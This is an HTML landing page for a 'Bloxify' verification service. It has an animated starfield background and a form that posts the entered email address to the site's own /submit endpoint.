<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Bloxify Verification</title>

<style>
html, body {
    margin: 0;
    width: 100%;
    height: 100%;
    overflow: hidden;
    background: #000;
    font-family: Arial, sans-serif;
    color: white;
}

/* ===== FLOWING SPACE BACKGROUND ===== */
#space {
    position: fixed;
    inset: -50%;
    background:
        radial-gradient(circle at 30% 30%, #222 0%, transparent 40%),
        radial-gradient(circle at 70% 60%, #1a1a1a 0%, transparent 45%),
        linear-gradient(120deg, #000, #111, #000);
    animation: wave 25s ease-in-out infinite alternate;
    z-index: 0;
}

@keyframes wave {
    0% { transform: translate(0, 0) scale(1); }
    100% { transform: translate(-4%, -6%) scale(1.1); }
}

/* ===== STARS ===== */
.star {
    position: absolute;
    width: 6px;
    height: 6px;
    background: white;
    border-radius: 50%;
    box-shadow: 0 0 10px rgba(255,255,255,0.8);
    cursor: pointer;
    z-index: 1;
}

/* ===== CENTER UI ===== */
#ui {
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    width: 420px;
    padding: 35px;
    background: linear-gradient(145deg, #050505, #0e0e0e);
    border-radius: 18px;
    box-shadow:
        0 0 30px rgba(255,255,255,0.15),
        inset 0 0 20px rgba(255,255,255,0.05);
    text-align: center;
    z-index: 5;
    animation: floatUI 6s ease-in-out infinite;
}

@keyframes floatUI {
    50% { transform: translate(-50%, -55%); }
}

h1 {
    margin: 0;
    font-size: 32px;
    letter-spacing: 1px;
}

p {
    color: #aaa;
    font-size: 14px;
    margin-top: 8px;
}

input {
    margin-top: 20px;
    width: 100%;
    padding: 14px;
    background: #111;
    border: none;
    border-radius: 10px;
    color: white;
    font-size: 16px;
    outline: none;
    box-shadow: inset 0 0 10px rgba(255,255,255,0.05);
}

button {
    margin-top: 15px;
    width: 100%;
    padding: 14px;
    background: #1a1a1a;
    border: none;
    border-radius: 10px;
    color: white;
    font-size: 16px;
    cursor: pointer;
}

button:hover {
    background: #222;
}
</style>
</head>

<body>

<div id="space"></div>

<div id="ui">
    <h1>Bloxify</h1>
    <p>Bloxify new-ish verification system ready to protect your servers!</p>

    <input id="email" placeholder="Enter your email">
    <button onclick="submitEmail()">Verify</button>
</div>

<script>
/* ===== CREATE FLOATING STARS ===== */
const STAR_COUNT = 80;

for (let i = 0; i < STAR_COUNT; i++) {
    const star = document.createElement("div");
    star.className = "star";
    star.style.left = Math.random() * innerWidth + "px";
    star.style.top = Math.random() * innerHeight + "px";

    let vx = (Math.random() - 0.5) * 0.3;
    let vy = (Math.random() - 0.5) * 0.3;

    function move() {
        let x = parseFloat(star.style.left) + vx;
        let y = parseFloat(star.style.top) + vy;

        if (x < 0 || x > innerWidth) vx *= -1;
        if (y < 0 || y > innerHeight) vy *= -1;

        star.style.left = x + "px";
        star.style.top = y + "px";

        requestAnimationFrame(move);
    }
    move();

    star.onclick = () => {
        star.animate([
            { transform: "translate(0,0)", opacity: 1 },
            {
                transform: `translate(${(Math.random()-0.5)*600}px, ${(Math.random()-0.5)*600}px)`,
                opacity: 0
            }
        ], { duration: 700, easing: "ease-out" });

        setTimeout(() => {
            star.style.left = Math.random() * innerWidth + "px";
            star.style.top = Math.random() * innerHeight + "px";
            star.style.opacity = 1;
        }, 700);
    };

    document.body.appendChild(star);
}

/* ===== SEND EMAIL TO BACKEND ===== */
function submitEmail() {
    fetch("/submit", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email: email.value })
    });
}
</script>

</body>
</html>
